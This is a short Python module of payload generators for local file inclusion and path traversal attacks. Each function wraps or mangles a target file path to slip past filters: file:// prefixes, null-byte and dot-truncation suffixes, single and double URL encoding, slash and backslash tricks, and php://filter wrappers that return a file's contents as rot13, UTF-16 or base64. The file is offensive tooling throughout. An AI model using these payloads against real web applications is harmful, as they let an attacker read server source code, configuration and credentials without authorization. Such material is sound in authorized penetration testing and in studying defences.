from urllib.parse import quote

def basic_file_leak(target_path) -> str:
    return 'file://' + target_path


def null_byte(target_path) -> str:
    return target_path + '%00'


def encoding(target_path) -> str:
    return quote(target_path)


def double_encoding(target_path) -> str:
    return quote(quote(target_path))


def path_dot_truncation1(target_path) -> str:
    return target_path + '.....................................'


def path_dot_truncation2(target_path) -> str:
    return target_path + '\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.'


def path_dot_truncation3(target_path) -> str:
    return target_path + '/././././././././././././././././././.'


def tricks1(target_path) -> str:
    target_path = target_path.replace('..', '....')
    target_path = target_path.replace('/', '//////')

    return target_path


def tricks2(target_path) -> str:
    target_path = target_path.replace('/', '/%5c')

    return target_path


def rot13_wrapper(target_file) -> str:
    return 'php://filter/read=string.rot13/resource=' + target_file


def utf16_wrapper(target_file) -> str:
    return 'php://filter/convert.iconv.utf-8.utf-16/resource=' + target_file


def base64_wrapper(target_file) -> str:
    return 'php://filter/convert.base64-encode/resource=' + target_file